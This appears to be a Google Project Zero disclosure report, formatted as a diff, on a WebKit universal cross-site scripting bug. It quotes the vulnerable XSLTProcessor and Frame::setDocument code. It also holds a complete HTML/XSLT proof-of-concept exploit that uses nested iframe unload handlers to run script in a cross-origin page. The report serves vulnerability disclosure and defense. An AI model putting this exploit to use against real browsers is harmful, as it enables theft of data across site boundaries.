@@ -1,0 +1,138 @@
+VULNERABILITY DETAILS
+https://trac.webkit.org/browser/webkit/trunk/Source/WebCore/xml/XSLTProcessor.cpp#L66
+```
+Ref<Document> XSLTProcessor::createDocumentFromSource(const String& sourceString,
+    const String& sourceEncoding, const String& sourceMIMEType, Node* sourceNode, Frame* frame)
+{
+    Ref<Document> ownerDocument(sourceNode->document());
+    bool sourceIsDocument = (sourceNode == &ownerDocument.get());
+    String documentSource = sourceString;
+
+    RefPtr<Document> result;
+    if (sourceMIMEType == "text/plain") {
+        result = XMLDocument::createXHTML(frame, sourceIsDocument ? ownerDocument->url() : URL());
+        transformTextStringToXHTMLDocumentString(documentSource);
+    } else
+        result = DOMImplementation::createDocument(sourceMIMEType, frame, sourceIsDocument ? ownerDocument->url() : URL());
+
+    // Before parsing, we need to save & detach the old document and get the new document
+    // in place. We have to do this only if we're rendering the result document.
+    if (frame) {
+[...]
+        frame->setDocument(result.copyRef());
+    }
+
+    auto decoder = TextResourceDecoder::create(sourceMIMEType);
+    decoder->setEncoding(sourceEncoding.isEmpty() ? UTF8Encoding() : TextEncoding(sourceEncoding), TextResourceDecoder::EncodingFromXMLHeader);
+    result->setDecoder(WTFMove(decoder));
+
+    result->setContent(documentSource);
+```
+
+https://trac.webkit.org/browser/webkit/trunk/Source/WebCore/page/Frame.cpp#L248
+```
+void Frame::setDocument(RefPtr<Document>&& newDocument)
+{
+    ASSERT(!newDocument || newDocument->frame() == this);
+
+    if (m_documentIsBeingReplaced) // ***1***
+        return;
+
+    m_documentIsBeingReplaced = true;
+
+[...]
+
+    if (m_doc && m_doc->pageCacheState() != Document::InPageCache)
+        m_doc->prepareForDestruction(); // ***2***
+
+    m_doc = newDocument.copyRef();
+```
+
+`setDocument` calls `Document::prepareForDestruction`, which might trigger JavaScript execution via
+a nested frame's "unload" event handler. Therefore the `m_documentIsBeingReplaced` flag has been
+introduced to avoid reentrant calls. The problem is that by the time `setDocument` is called,
+`newDocument` might already have a reference to a `Frame` object, and if the method returns early,
+that reference will never get cleared by subsequent navigations. It's not possible to trigger
+document replacement inside `setDocument` via a regular navigation request or a 'javascript:' URI
+load; however, an attacker can use an XSLT transformation for that.
+
+When the attacker has an extra document attached to a frame, they can navigate the frame to a
+cross-origin page and issue a form submission request to a 'javascript:' URI using the extra
+document to trigger UXSS.
+
+VERSION
+WebKit revision 245321.
+It should affect the stable branch as well, but the test case crashes Safari 12.1.1 (14607.2.6.1.1).
+
+REPRODUCION CASE
+repro.html:
+```
+<body>
+<script>
+createFrame = doc => doc.body.appendChild(document.createElement('iframe'));
+
+pi = document.createProcessingInstruction('xml-stylesheet',
+  'type="text/xml" href="stylesheet.xml"');
+cache_frame = createFrame(document);
+cache_frame.contentDocument.appendChild(pi);
+
+setTimeout(() => {
+  victim_frame = createFrame(document);
+  child_frame_1 = createFrame(victim_frame.contentDocument);
+  child_frame_1.contentWindow.onunload = () => {
+    victim_frame.src = 'javascript:""';
+    try {
+      victim_frame.contentDocument.appendChild(document.createElement('html')).
+        appendChild(document.createElement('body'));
+    } catch { }
+    
+    child_frame_2 = createFrame(victim_frame.contentDocument);
+    child_frame_2.contentWindow.onunload = () => {
+      doc = victim_frame.contentDocument;
+      doc.write('foo');
+      doc.firstChild.remove();
+
+      doc.appendChild(pi);
+      doc.appendChild(doc.createElement('root'));
+
+      doc.close();
+    }
+  }
+
+  victim_frame.src = 'javascript:""';
+
+  if (child_frame_1.xslt_script_run) {
+    victim_frame.src = 'http://example.com/';
+    victim_frame.onload = () => {
+      form = corrupted_doc.createElement('form');
+      form.action = 'javascript:alert(document.body.innerHTML)';
+      form.submit();
+    }
+  }
+}, 2000);
+</script>
+</body> 
+
+```
+
+stylesheet.xml:
+```
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<html>
+<body>
+<script>
+<![CDATA[
+document.body.lastChild.xslt_script_run = true;
+]]>
+</script>
+<iframe src="javascript:top.corrupted_doc = frameElement.ownerDocument; frameElement.remove();"></iframe>
+</body>
+</html>
+</xsl:template>
+</xsl:stylesheet>
+
+```
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
